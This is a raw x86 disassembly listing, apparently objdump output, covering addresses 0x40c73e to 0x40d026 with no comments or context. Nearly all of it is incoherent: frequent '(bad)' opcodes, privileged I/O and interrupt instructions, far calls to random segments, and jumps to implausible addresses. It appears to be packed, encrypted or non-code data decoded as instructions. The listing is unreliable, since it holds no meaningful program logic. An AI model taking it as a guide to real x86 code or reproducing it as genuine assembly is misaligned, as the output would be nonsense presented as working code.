  40c73e:	pop    eax
  40c73f:	jnp    0x40c71c
  40c741:	(bad)  
  40c742:	cmp    esp,DWORD PTR [edi+0x6f506a02]
  40c748:	add    esi,ebp
  40c74a:	sti    
  40c74b:	dec    ecx
  40c74c:	pop    eax
  40c74d:	inc    ecx
  40c74e:	fld    TBYTE PTR [eax+0x3e93a]
	...
  40c768:	dec    esp
  40c769:	jg     0x40c7cc
  40c76b:	cmp    BYTE PTR [edi],ch
  40c76d:	jp     0x40c769
  40c76f:	shl    BYTE PTR [ebx-0x50caba36],cl
  40c775:	jns    0x40c70a
  40c777:	iret   
  40c778:	sub    eax,0x135835f1
  40c77d:	into   
  40c77e:	call   0x5a03:0xecc0dffb
  40c785:	jns    0x40c793
  40c787:	xchg   ah,ah
  40c789:	loop   0x40c749
  40c78b:	xchg   BYTE PTR [ebx-0x58bb555c],dh
  40c791:	add    bh,BYTE PTR [ecx+esi*8-0x17]
  40c795:	pop    es
  40c796:	inc    edi
  40c797:	inc    ebp
  40c798:	data16 add al,BYTE PTR [eax]
  40c79b:	call   0x2f40ca44
  40c7a0:	sub    al,BYTE PTR [ecx+eax*2-0x17]
  40c7a4:	jecxz  0x40c7aa
  40c7a6:	data16 test al,0x8d
  40c7a9:	add    BYTE PTR [ebx-0x7c9b5651],al
  40c7af:	bt     DWORD PTR [edi-0xd],edx
  40c7b3:	push   0xffffffb0
  40c7b5:	loopne 0x40c7e4
  40c7b7:	sub    BYTE PTR [ebx+0x626d0f02],ah
  40c7bd:	int    0xfe
  40c7bf:	jmp    0xd81ed5e7
  40c7c4:	in     eax,0x2
  40c7c6:	add    dh,ch
  40c7c8:	and    bh,bl
  40c7ca:	(bad)  
  40c7cb:	call   0x40c7d0
	...
  40c7e0:	add    BYTE PTR [ecx+eax*4+0x438c3b3c],ah
  40c7e7:	add    cl,ch
  40c7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ea:	xchg   al,ah
  40c7ec:	jmp    0x2d07ca95
  40c7f1:	ja     0x40c7c0
  40c7f3:	(bad)  
  40c7f4:	jmp    0x61858d9d
  40c7f9:	stos   DWORD PTR es:[edi],eax
  40c7fa:	add    al,BYTE PTR [eax]
  40c7fc:	jmp    0xba3d0eba
  40c801:	mov    cl,0x46
  40c803:	clc    
  40c804:	mov    ecx,0x3d6802ca
  40c809:	imul   eax,DWORD PTR [ebx+0x0],0x2daf103e
  40c810:	test   al,0xa4
  40c812:	stc    
  40c813:	mov    edi,0xff9720de
  40c818:	call   0x21bd49c1
  40c81d:	mov    ds:0xab4583fd,eax
  40c822:	add    al,BYTE PTR [eax]
  40c824:	push   0x58
  40c826:	into   
  40c827:	(bad)  
  40c828:	(bad)  
  40c829:	fld    DWORD PTR [eax+eiz*4-0x74ff3200]
  40c830:	jne    0x40c80c
  40c832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c833:	add    BYTE PTR [eax],0xbe
  40c836:	add    BYTE PTR [esi-0x75],dl
  40c839:	mov    al,ds:0x491874b3
  40c83e:	inc    esp
  40c83f:	lock call DWORD PTR [eax-0x2e]
  40c843:	lea    eax,[ebp+0x0]
	...
  40c85a:	shr    BYTE PTR [eax],cl
  40c85c:	stos   BYTE PTR es:[edi],al
  40c85d:	inc    edx
  40c85e:	iret   
  40c85f:	push   es
  40c860:	call   0x47893c
  40c865:	rcr    DWORD PTR [esi-0x79],1
  40c868:	mov    esi,0xe0450702
  40c86d:	push   0x4145d4
  40c872:	or     DWORD PTR [ebp-0x1c],eax
  40c875:	mov    ebx,0x7efffee2
  40c87b:	add    BYTE PTR [ebp+0x6a103645],cl
  40c881:	add    DWORD PTR [esi+eax*1+0x44cb006a],esi
  40c888:	loopne 0x40c8da
  40c88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88b:	push   es
  40c88c:	lea    eax,[ebp-0x22]
  40c88f:	ud0    edx,DWORD PTR ds:0x40e8fc
  40c896:	inc    ebp
  40c897:	shl    BYTE PTR [edx+0x2d],0xbd
  40c89b:	cmp    al,0xec
  40c89d:	add    BYTE PTR [edx+0x1b],ah
  40c8a0:	mov    eax,0xe01
  40c8a5:	or     edi,DWORD PTR [esi+0x53ff1633]
  40c8ab:	enter  0x75fd,0x96
  40c8af:	mov    dl,0x73
  40c8b1:	in     al,dx
  40c8b2:	cdq    
  40c8b3:	sub    DWORD PTR [eax],ecx
  40c8b5:	push   0xef02dda7
  40c8ba:	sub    DWORD PTR [edx],eax
  40c8bc:	sti    
  40c8bd:	clc    
	...
  40c8d2:	add    al,ah
  40c8d4:	add    al,0xd0
  40c8d6:	je     0x40c8a3
  40c8d8:	icebp  
  40c8d9:	xchg   ebp,eax
  40c8da:	inc    esp
  40c8db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8dc:	fnstenv [eax]
  40c8de:	call   FWORD PTR [edx-0x2f]
  40c8e1:	add    ch,0xab
  40c8e4:	pop    eax
  40c8e5:	push   ecx
  40c8e6:	clc    
  40c8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e8:	xor    eax,0xd97182fd
  40c8ed:	std    
  40c8ee:	test   BYTE PTR [eax],bh
  40c8f0:	mov    esp,0xea0fece
  40c8f5:	sar    dh,1
  40c8f7:	mov    dl,0xb7
  40c8f9:	sbb    eax,0xbcf3a741
  40c8fe:	shl    DWORD PTR [ebx-0x6c74c827],0x58
  40c905:	enter  0xdf7,0xda
  40c909:	pop    eax
  40c90a:	das    
  40c90b:	jo     0x40c8fb
  40c90d:	sti    
  40c90e:	out    0x46,eax
  40c910:	jmp    0x7fd0:0x1e2efece
  40c917:	call   0x57d9:0xa74140b2
  40c91e:	sub    DWORD PTR [edi-0x58bebf75],edi
  40c924:	mov    cl,0xe5
  40c926:	inc    eax
  40c927:	out    0xd9,al
  40c929:	(bad)  
  40c92b:	mov    cl,0x34
  40c92d:	iret   
  40c92e:	test   BYTE PTR [edi-0x4b],ah
  40c931:	sub    ebp,DWORD PTR [eax-0x33]
  40c934:	xchg   edi,eax
  40c935:	inc    ebx
	...
  40c94a:	add    BYTE PTR [eax],al
  40c94c:	(bad)  
  40c94d:	rol    BYTE PTR [eax+0x41],cl
  40c950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c951:	inc    ecx
  40c952:	mov    dl,0x7d
  40c954:	or     BYTE PTR [esi+eax*8],bl
  40c957:	add    al,0xce
  40c959:	add    ch,BYTE PTR [ebx+0x6a01a744]
  40c95f:	adc    ecx,eax
  40c961:	inc    eax
  40c962:	test   al,0x3
  40c964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c965:	push   esi
  40c966:	rol    esi,cl
  40c968:	imul   ecx,edx,0xffffffe8
  40c96b:	add    esp,DWORD PTR [edi+0x60c3d202]
  40c971:	xor    bl,BYTE PTR [ecx-0x65358c80]
  40c977:	into   
  40c978:	fwait
  40c979:	sbb    al,0x2b
  40c97b:	inc    ebp
  40c97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c97d:	test   DWORD PTR [eax-0x9285ab4],ebp
  40c983:	sub    BYTE PTR [ebx],0xca
  40c986:	call   0xdf1e6ee3
  40c98b:	into   
  40c98c:	adc    ecx,ebx
  40c98e:	mov    ebp,0x3ada9f58
  40c993:	retf   
  40c994:	mov    edx,ecx
  40c996:	popa   
  40c997:	cmp    BYTE PTR [edi+0x7e],bh
  40c99a:	cli    
  40c99b:	into   
  40c99c:	repz retf 0x319d
  40c9a0:	lahf   
  40c9a1:	leave  
  40c9a2:	sbb    edi,esp
  40c9a4:	cmp    BYTE PTR ds:0xca61ce8c,0xfb
  40c9ab:	sti    
  40c9ac:	inc    eax
  40c9ad:	push   ds
  40c9ae:	jg     0x40c97e
	...
  40c9c4:	add    BYTE PTR [ecx-0x36],dl
  40c9c7:	sti    
  40c9c8:	iret   
  40c9c9:	dec    ecx
  40c9ca:	push   eax
  40c9cb:	loope  0x40c9a8
  40c9cd:	aam    0x53
  40c9cf:	data16 into 
  40c9d1:	outs   dx,DWORD PTR ds:[esi]
  40c9d2:	(bad)
  40c9d5:	fidivr DWORD PTR [ebp+0x44]
  40c9d8:	and    BYTE PTR [ebx+edx*8-0x4a],0x36
  40c9dd:	je     0x40ca5c
  40c9df:	fwait
  40c9e0:	jmp    ecx
  40c9e2:	add    al,0xe9
  40c9e4:	add    esp,DWORD PTR [edi+0x6f360002]
  40c9ea:	cli    
  40c9eb:	out    0x6d,eax
  40c9ed:	push   0xec6a0002
  40c9f2:	add    dh,BYTE PTR [edi-0x10]
  40c9f5:	(bad)  
  40c9f6:	ret    0xb65a
  40c9f9:	mov    edx,0xa4e1c1bb
  40c9fe:	mov    bl,0xe7
  40ca00:	jb     0x40c9a1
  40ca02:	test   BYTE PTR [eax+0xeb14deb],0x6b
  40ca09:	dec    cl
  40ca0b:	(bad)  
  40ca0c:	jmp    0x7249184e
  40ca11:	push   0x4943eafa
  40ca16:	jge    0x40ca1d
  40ca18:	imul   edx,edi,0x24e37219
  40ca1e:	int    0x38
  40ca20:	mov    al,ds:0x6ff9eb82
  40ca26:	in     al,dx
  40ca27:	jg     0x40c9de
	...
  40ca3d:	add    ah,ah
  40ca3f:	push   esp
  40ca40:	or     eax,0x773f5769
  40ca45:	icebp  
  40ca46:	and    al,0xdd
  40ca48:	inc    eax
  40ca49:	imul   ebx,DWORD PTR [edi-0x5],0xc28fe0ea
  40ca50:	pop    edx
  40ca51:	cs xchg ecx,eax
  40ca53:	mov    ebx,0x6a4f1c1
  40ca58:	xor    bl,bh
  40ca5a:	dec    esp
  40ca5b:	or     eax,0x16a0fe39
  40ca60:	xor    BYTE PTR [edx-0x24bef2c6],al
  40ca66:	ds or  eax,0x16aad646
  40ca6c:	inc    ecx
  40ca6d:	in     eax,dx
  40ca6e:	fmul   QWORD PTR cs:[eax]
  40ca71:	add    ch,bl
  40ca73:	sub    ebx,DWORD PTR [edi+0x0]
  40ca76:	inc    eax
  40ca77:	mov    eax,es
  40ca79:	or     dh,bh
  40ca7b:	(bad)  
  40ca7c:	fiadd  WORD PTR [esp+eax*1]
  40ca7f:	shr    DWORD PTR [eax+0xc08d4b],0xb
  40ca86:	xor    DWORD PTR gs:[edx-0x236b475],esp
  40ca8d:	xor    BYTE PTR [ecx+0x3bfff841],al
  40ca93:	int    0x8d
  40ca95:	inc    ebp
  40ca96:	mov    ds:0xbef443bf,al
  40ca9b:	add    al,0x0
  40ca9d:	add    BYTE PTR ds:0x2951f9,bh
	...
  40cab7:	syscall 
  40cab9:	add    BYTE PTR [eax+edi*2+0x49],dh
  40cabd:	inc    esp
  40cabe:	lock outs dx,BYTE PTR ds:[esi]
  40cac0:	sub    al,0x1
  40cac2:	push   0xffffffbe
  40cac4:	sub    al,BYTE PTR [eax]
  40cac6:	push   0xffffff8e
  40cac8:	sub    al,BYTE PTR [eax]
  40caca:	(bad)  
  40cacb:	retf   
  40cacc:	mov    dh,0x4e
  40cace:	(bad)  
  40cacf:	jnp    0x40cae3
  40cad1:	sub    DWORD PTR [ecx+0x7e],eax
  40cad4:	retf   
  40cad5:	mov    esi,0x7b837474
  40cada:	hlt    
  40cadb:	mov    ?,WORD PTR [eax]
  40cadd:	xor    al,0x8b
  40cadf:	retf   
  40cae0:	add    cl,BYTE PTR [ebx+0x7fb0e4d]
  40cae6:	ja     0x40cb4c
  40cae8:	mov    eax,0x4ada7589
  40caed:	jl     0x40caf7
  40caef:	aad    0x8
  40caf1:	lock jecxz 0x40cb30
  40caf4:	mov    bl,0xa2
  40caf6:	mov    ecx,DWORD PTR [ebx-0x218a00fe]
  40cafc:	inc    esi
  40cafd:	(bad)  
  40cafe:	(bad)  
  40caff:	pop    ebx
  40cb00:	mov    al,0xe6
  40cb02:	jecxz  0x40caab
  40cb04:	pushf  
  40cb05:	add    al,BYTE PTR [eax]
  40cb07:	pop    edi
  40cb08:	fild   DWORD PTR [edx]
  40cb0a:	add    BYTE PTR [edi-0x21a1d45c],ah
  40cb10:	sbb    edi,ebx
  40cb12:	(bad)  
  40cb13:	mov    ebp,0x615f2819
  40cb18:	and    al,cl
  40cb1a:	pop    es
	...
  40cb2f:	add    BYTE PTR [edi+0x24eb7786],ah
  40cb35:	push   ds
  40cb36:	ret    
  40cb37:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40cb39:	mov    ecx,0x38cf0002
  40cb3e:	push   ecx
  40cb3f:	(bad)  
  40cb40:	fcom   DWORD PTR [edx+0x46]
  40cb43:	cld    
  40cb44:	aas    
  40cb45:	fldenv [edx]
  40cb47:	add    BYTE PTR [edi-0x3f8e6eff],ah
  40cb4d:	fdivr  DWORD PTR [eax+0x44]
  40cb50:	mov    edi,0xa7200431
  40cb55:	(bad)  
  40cb57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb58:	xor    eax,0xea88cab0
  40cb5d:	lods   eax,DWORD PTR ds:[esi]
  40cb5e:	pop    ebx
  40cb5f:	add    bh,al
  40cb61:	fld    DWORD PTR [edx]
  40cb63:	call   0xff0bd697
  40cb68:	push   ds
  40cb69:	push   ss
  40cb6a:	aam    0x67
  40cb6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb6d:	stc    
  40cb6e:	add    eax,DWORD PTR [eax]
  40cb70:	(bad)  
  40cb71:	push   esp
  40cb72:	push   esi
  40cb73:	push   DWORD PTR [eax+0x52]
  40cb76:	inc    ecx
  40cb77:	in     al,dx
  40cb78:	(bad)  
  40cb79:	fldenv [edx]
  40cb7b:	add    BYTE PTR [edi+0x58724981],ah
  40cb81:	cmp    BYTE PTR [esp+eax*2+0x3f],0xf1
  40cb86:	add    esp,DWORD PTR [eax]
  40cb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb89:	(bad)  
  40cb8b:	jo     0x40cb42
  40cb8d:	pop    eax
  40cb8e:	retf   
  40cb8f:	mov    dl,ah
  40cb91:	add    cl,BYTE PTR [ebp-0x35]
	...
  40cba8:	add    BYTE PTR [ebx-0x1beb2f0e],bh
  40cbae:	inc    ecx
  40cbaf:	jmp    0x4107677e
  40cbb4:	jnp    0x40cc1a
  40cbb6:	add    ch,cl
  40cbb8:	xchg   ah,ah
  40cbba:	cmc    
  40cbbb:	cmp    eax,0xad5ab751
  40cbc0:	inc    esi
  40cbc1:	data16 add ch,BYTE PTR [esi]
  40cbc4:	push   ecx
  40cbc5:	(bad)  
  40cbc6:	fldenv [edi+edi*1-0x3f95fd59]
  40cbcd:	pushf  
  40cbce:	(bad)  
  40cbcf:	fwait
  40cbd0:	repz dec eax
  40cbd2:	sub    DWORD PTR [edx+0x7bc7a744],ebp
  40cbd8:	iret   
  40cbd9:	enter  0xa558,0x3
  40cbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbde:	sub    DWORD PTR [eax+edi*8],0xffffffc1
  40cbe2:	dec    esp
  40cbe3:	fstp   DWORD PTR [ebx+0x3f]
  40cbe6:	inc    ebx
  40cbe7:	sub    BYTE PTR [eax+esi*4],al
  40cbea:	dec    esp
  40cbeb:	(bad)  
  40cbed:	push   edx
  40cbee:	ds jmp 0xdcffeff7
  40cbf4:	retf   0xf313
  40cbf7:	push   eax
  40cbf8:	jg     0x40cbdf
  40cbfa:	inc    ebx
  40cbfb:	jmp    0xc117dfca
  40cc00:	inc    esi
  40cc01:	jmp    0x40cc05
  40cc03:	jmp    0xa638308e
  40cc08:	push   eax
  40cc09:	mov    ds:0x46485a,eax
	...
  40cc22:	out    0x2,al
  40cc24:	xchg   esi,eax
  40cc25:	push   eax
  40cc26:	dec    edi
  40cc27:	fcmovnu st,st(0)
  40cc29:	aas    
  40cc2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc2b:	add    ch,BYTE PTR [edx-0x41]
  40cc2e:	pushf  
  40cc2f:	(bad)
  40cc32:	rcl    BYTE PTR [edi+0x2ea29ff],0xff
  40cc39:	hlt    
  40cc3a:	pop    eax
  40cc3b:	ficomp WORD PTR [ebp*4+0x258302a4]
  40cc42:	xor    BYTE PTR [eax+eax*1+0x56],bl
  40cc46:	ja     0x40cc0e
  40cc48:	(bad)  
  40cc49:	aam    0x10
  40cc4b:	lds    esi,FWORD PTR [ecx+edi*4]
  40cc4e:	mov    bl,0x43
  40cc50:	add    BYTE PTR [ecx+0x55],dl
  40cc53:	push   edx
  40cc54:	push   DWORD PTR [esi]
  40cc56:	cmp    DWORD PTR [esi],0xffffffe0
  40cc59:	ret    
  40cc5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc5b:	lds    esi,FWORD PTR [ecx+eiz*1-0x23]
  40cc5f:	dec    esi
  40cc60:	or     al,0x1e
  40cc62:	xchg   edi,eax
  40cc63:	push   edx
  40cc64:	sub    DWORD PTR [eax-0x6a3f255c],ebp
  40cc6a:	in     eax,dx
  40cc6b:	les    ecx,FWORD PTR [eax+0x5c08ac]
  40cc71:	(bad)  
  40cc72:	pop    eax
  40cc73:	into   
  40cc74:	(bad)  
  40cc75:	jl     0x40cc2f
  40cc77:	les    esi,FWORD PTR [ecx+edi*2]
  40cc7a:	fwait
  40cc7b:	inc    ebx
  40cc7c:	add    cl,dl
  40cc7e:	adc    dl,BYTE PTR [edx-0x1]
  40cc81:	fisubr WORD PTR [esi+edi*1]
  40cc84:	fadd   DWORD PTR [ebx+0x0]
	...
  40cc9b:	stos   DWORD PTR es:[edi],eax
  40cc9c:	lds    esi,FWORD PTR [ecx+ebx*8+0x6e]
  40cca0:	dec    esi
  40cca1:	call   0x29936d6c
  40cca6:	sub    BYTE PTR [ebx+0x6e3d94da],ah
  40ccac:	les    ecx,FWORD PTR [eax+0x5b3724]
  40ccb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccb3:	loopne 0x40cc8b
  40ccb5:	(bad)  
  40ccb6:	adc    al,0x4b
  40ccb8:	les    esi,FWORD PTR [ecx+ebx*1]
  40ccbb:	mov    esp,0xee810043
  40ccc0:	dec    esi
  40ccc1:	inc    DWORD PTR [eax]
  40ccc3:	sub    DWORD PTR [ecx+0x44],ecx
  40ccc6:	sar    BYTE PTR [ebx-0x46af3ffb],1
  40cccc:	xor    eax,0xcd33ffe4
  40ccd1:	std    
  40ccd2:	xor    eax,0x40e84e
  40ccd7:	(bad)  
  40ccd8:	arpl   WORD PTR [edi+edi*8+0x79],si
  40ccdc:	dec    ecx
  40ccdd:	inc    esp
  40ccde:	int3   
  40ccdf:	lea    edi,ds:0x451900e0
  40cce5:	mov    dh,0x0
  40cce7:	inc    BYTE PTR [eax]
  40cce9:	cmp    DWORD PTR [ebp-0x5e],0xfffffffe
  40cced:	push   cs
  40ccee:	test   BYTE PTR [ebx-0x2],bh
  40ccf1:	(bad)  
  40ccf2:	(bad)  
  40ccf3:	jge    0x40cd32
  40ccf5:	rol    BYTE PTR [eax],1
  40ccf7:	stc    
  40ccf8:	inc    esp
  40ccf9:	mov    ds:0x8d00ce00,al
  40ccfe:	inc    ebp
	...
  40cd13:	add    BYTE PTR [edx-0x4d8a00f2],al
  40cd19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd1a:	dec    esi
  40cd1b:	std    
  40cd1c:	leave  
  40cd1d:	mov    ecx,0x44c9c009
  40cd22:	mov    es,WORD PTR [eax]
  40cd24:	into   
  40cd25:	add    BYTE PTR [ebx+0xf01027d],al
  40cd2b:	test   BYTE PTR [ebx+0x1],al
  40cd2e:	add    BYTE PTR [eax],al
  40cd30:	or     eax,DWORD PTR ds:0x356950c8
  40cd36:	shr    al,1
  40cd38:	mov    WORD PTR [ebp-0x3f6a0003],?
  40cd3e:	jb     0x40cdb5
  40cd40:	or     eax,0xb200c83d
  40cd45:	sub    DWORD PTR [eax+0x10],ebp
  40cd48:	jle    0x40ccf5
  40cd4a:	mov    esp,0xe6c693ff
  40cd4f:	jbe    0x40ccf8
  40cd51:	dec    al
  40cd53:	(bad)  
  40cd54:	pop    eax
  40cd55:	out    dx,eax
  40cd56:	jecxz  0x40cd56
  40cd58:	fcmovbe st,st(1)
  40cd5a:	fcmove st,st(4)
  40cd5c:	mov    edx,0xbafec844
  40cd61:	ins    DWORD PTR es:[edi],dx
  40cd62:	(bad)  
  40cd63:	je     0x40cd14
  40cd65:	add    esp,0xc85d306c
  40cd6b:	je     0x40cdbc
  40cd6d:	and    eax,0x650f084e
  40cd72:	push   ebp
  40cd73:	call   FWORD PTR [eax]
  40cd75:	xor    eax,0xc44e
	...
  40cd8a:	add    BYTE PTR [eax],al
  40cd8c:	add    BYTE PTR [eax],dl
  40cd8e:	xchg   DWORD PTR [esi-0x252e6d02],ebp
  40cd94:	jl     0x40cd28
  40cd96:	or     al,0xc8
  40cd98:	(bad)  
  40cd99:	jb     0x40cdbc
  40cd9b:	enter  0xd774,0x1c
  40cd9f:	dec    esi
  40cda0:	or     bh,bh
  40cda2:	je     0x40cdf9
  40cda4:	jmp    eax
  40cda6:	pop    eax
  40cda7:	inc    esi
  40cda8:	int3   
  40cda9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdaa:	ins    DWORD PTR es:[edi],dx
  40cdab:	in     eax,dx
  40cdac:	adc    BYTE PTR [edx+0x19],0xff
  40cdb0:	je     0x40cd4a
  40cdb2:	push   eax
  40cdb3:	ds int3 
  40cdb5:	ror    BYTE PTR [ecx+0x1af74c7],0x23
  40cdbc:	ins    DWORD PTR es:[edi],dx
  40cdbd:	mov    al,0xdc
  40cdbf:	fimul  DWORD PTR [ecx]
  40cdc1:	cmp    eax,0xaf74c5d9
  40cdc6:	shr    edi,0x6c
  40cdc9:	cwde   
  40cdca:	mov    ah,0xc6
  40cdcc:	je     0x40cd61
  40cdce:	mov    cl,0x82
  40cdd0:	outs   dx,DWORD PTR ds:[esi]
  40cdd1:	mov    BYTE PTR [esi+eax*8+0x4ac17f74],al
  40cdd8:	jo     0x40ce52
  40cdda:	xchg   esp,eax
  40cddb:	(bad)  
  40cddc:	je     0x40ce59
  40cdde:	add    dl,BYTE PTR [ecx-0x623c08ad]
  40cde4:	(bad)  
  40cde5:	fcmovnbe st,st(2)
  40cde7:	sbb    BYTE PTR [ebx-0x29],0xc3
  40cdeb:	(bad)  
  40cdec:	(bad)  
  40cded:	fcmovnbe st,st(6)
  40cdef:	nop
  40cdf0:	arpl   WORD PTR [eax],ax
	...
  40ce06:	xlat   BYTE PTR ds:[ebx]
  40ce07:	ret    
  40ce08:	jge    0x40cdd1
  40ce0a:	mov    ebx,0xb72b80da
  40ce0f:	ret    
  40ce10:	ins    DWORD PTR es:[edi],dx
  40ce11:	(bad)  
  40ce12:	mov    ebx,0xb73350de
  40ce17:	ret    
  40ce18:	pop    ebp
  40ce19:	(bad)  
  40ce1a:	fwait
  40ce1b:	loop   0x40ce5d
  40ce1d:	cmp    edx,DWORD PTR [edi-0x6438b23d]
  40ce23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce24:	push   eax
  40ce25:	inc    ebx
  40ce26:	xchg   edi,eax
  40ce27:	ret    
  40ce28:	cmp    eax,0x40aa7bc7
  40ce2d:	or     esi,DWORD PTR [edi-0x3d]
  40ce30:	sub    eax,0x10ae7bc7
  40ce35:	adc    esi,DWORD PTR [edi-0x3d]
  40ce38:	sbb    eax,0xb25bc7
  40ce3d:	sbb    edx,DWORD PTR [edi-0x3d]
  40ce40:	or     eax,0x10b65bc7
  40ce45:	and    edx,DWORD PTR [edi-0x3d]
  40ce48:	std    
  40ce49:	mov    esp,0x30e8f5e6
  40ce4e:	sub    al,0xd6
  40ce50:	addr16 ror al,0xca
  40ce54:	in     eax,0xc6
  40ce56:	sbb    edi,DWORD PTR ds:0x38a033dd
  40ce5c:	in     eax,0xc6
  40ce5e:	shl    DWORD PTR [edx],cl
  40ce60:	add    BYTE PTR [ebp-0x59],al
  40ce63:	stos   BYTE PTR es:[edi],al
  40ce64:	dec    esp
  40ce65:	inc    edx
  40ce66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce67:	add    dh,dl
  40ce69:	ret    
	...
  40ce7e:	add    BYTE PTR [ecx-0x5c230079],dh
  40ce84:	add    al,BYTE PTR [eax]
  40ce86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce87:	out    0xba,eax
  40ce89:	(bad)  
  40ce8a:	call   0x2507d133
  40ce8f:	ja     0x40ce52
  40ce91:	push   es
  40ce92:	jmp    0x340fb3b
  40ce97:	stos   DWORD PTR es:[edi],eax
  40ce98:	sub    al,0x0
  40ce9a:	adc    esp,DWORD PTR [ebx+0x7475448f]
  40cea0:	pop    DWORD PTR [ecx+edi*2+0x19fec169]
  40cea7:	push   0xd766f837
  40ceac:	mov    esi,0x26517e7
  40ceb1:	add    dl,ah
  40ceb3:	in     al,0x35
  40ceb5:	add    eax,0xfec24140
  40ceba:	jmp    0xa868722b
  40cebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cec0:	shl    DWORD PTR [ebp+eiz*8-0x24],0x5a
  40cec5:	jae    0x40cef5
  40cec7:	jmp    0x6f7a5a1d
  40cecc:	xchg   bh,ch
  40cece:	push   ss
  40cecf:	jmp    0xfcfc1e94
  40ced4:	dec    edx
  40ced5:	jae    0x40cee5
  40ced7:	jmp    0xd9525366
  40cedc:	sar    dh,0x11
  40cedf:	dec    ecx
  40cee0:	xor    bh,bh
  40cee2:	test   BYTE PTR [eax],0x0
	...
  40cef5:	add    BYTE PTR [eax],al
  40cef7:	add    BYTE PTR [eax],dh
  40cef9:	inc    esi
  40cefa:	lock cdq 
  40cefc:	dec    esp
  40cefd:	out    0x42,eax
  40ceff:	sub    BYTE PTR [ebx+0x72d1b4c1],ah
  40cf05:	sar    dh,0xd6
  40cf08:	test   al,0x32
  40cf0a:	sub    DWORD PTR [eax],ebp
  40cf0c:	stos   DWORD PTR es:[edi],eax
  40cf0d:	stos   BYTE PTR es:[edi],al
  40cf0e:	pushf  
  40cf0f:	add    ah,cl
  40cf11:	(bad)  
  40cf12:	std    
  40cf13:	mov    DWORD PTR [ebx],ecx
  40cf15:	fcomi  st,st(5)
  40cf17:	push   DWORD PTR [ecx]
  40cf19:	cmp    DWORD PTR [ebx-0x238c614],0x0
  40cf20:	mov    ch,ah
  40cf22:	cmp    BYTE PTR [ebp+0x3e],0x2
  40cf26:	jne    0x40cf71
  40cf28:	lds    eax,FWORD PTR [ecx-0x15]
  40cf2b:	mul    DWORD PTR [ecx]
  40cf2d:	(bad)  
  40cf2e:	std    
  40cf2f:	xor    cl,dl
  40cf31:	inc    ecx
  40cf32:	jmp    0x40cf2b
  40cf34:	rol    edi,0x7f
  40cf37:	mov    ebp,0xfffdcf22
  40cf3c:	add    eax,DWORD PTR es:[eax]
  40cf3f:	add    BYTE PTR [eax-0x45],cl
  40cf42:	lds    eax,FWORD PTR [ebp-0x2308e]
  40cf48:	add    ax,WORD PTR [eax]
  40cf4b:	add    BYTE PTR [ebp-0x54],ah
  40cf4e:	std    
  40cf4f:	lea    esi,[edx-0x31]
  40cf52:	std    
  40cf53:	inc    ecx
  40cf55:	xchg   ecx,eax
  40cf56:	jmp    0xb5:0xfdc7b1f7
	...
  40cf71:	iretw  
  40cf73:	std    
  40cf74:	inc    ecx
  40cf76:	push   ecx
  40cf77:	or     al,ch
  40cf79:	push   es
  40cf7a:	leave  
  40cf7b:	std    
  40cf7c:	dec    DWORD PTR [ebp-0x77]
  40cf7f:	jmp    0x8374:0xfec7a1f7
  40cf86:	(bad)  
  40cf87:	mov    bl,0xec
  40cf89:	mov    ecx,0xd2e8fdc5
  40cf8e:	push   ebp
  40cf8f:	(bad)  
  40cf90:	inc    ecx
  40cf92:	(bad)
  40cf96:	vmovss xmm1,xmm3,xmm6
  40cf9a:	(bad)  
  40cf9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf9e:	sahf   
  40cf9f:	(bad)  
  40cfa1:	nop
  40cfa2:	rol    ebx,1
  40cfa4:	je     0x40cf45
  40cfa6:	rcr    esi,1
  40cfa8:	std    
  40cfa9:	add    BYTE PTR [ecx-0x7e704b3d],0xc3
  40cfb0:	(bad)  
  40cfb1:	jg     0x40d025
  40cfb3:	push   esp
  40cfb4:	jmp    FWORD PTR [eax+0x69]
  40cfb7:	cmp    eax,0xc4654ef8
  40cfbc:	(bad)  
  40cfbd:	pop    eax
  40cfbe:	cdq    
  40cfbf:	dec    ebp
  40cfc0:	cld    
  40cfc1:	aas    
  40cfc2:	in     al,dx
  40cfc3:	inc    edx
  40cfc4:	add    BYTE PTR [edi-0x58f83f8e],ah
  40cfca:	push   ss
  40cfcb:	jns    0x40cfb8
  40cfcd:	and    al,0x6e
  40cfcf:	(bad)  
  40cfd0:	imul   esp,DWORD PTR [edi+0xff1403],0x0
	...
  40cfea:	mov    dl,0xb1
  40cfec:	fimul  DWORD PTR [ecx]
  40cfee:	xchg   ebx,eax
  40cfef:	pusha  
  40cff0:	les    ecx,FWORD PTR [eax+0xf5b5562]
  40cff6:	fs push 0x2
  40cff9:	call   DWORD PTR [edx+0x1a2dab1]
  40cfff:	add    esp,eax
  40d001:	(bad)  
  40d002:	jb     0x40cff9
  40d004:	ret    
  40d005:	je     0x40cfa6
  40d007:	inc    ecx
  40d008:	push   cs
  40d009:	ins    BYTE PTR es:[edi],dx
  40d00a:	call   0xac0289f7
  40d00f:	test   eax,0x2ccb8b2d
  40d014:	mov    edi,0x587879fb
  40d019:	add    BYTE PTR ds:0xaf74c37a,bh
  40d01f:	adc    DWORD PTR [edx+ebp*2+0x4478b8b8],ebp
  40d026:	mov    bl,0x24
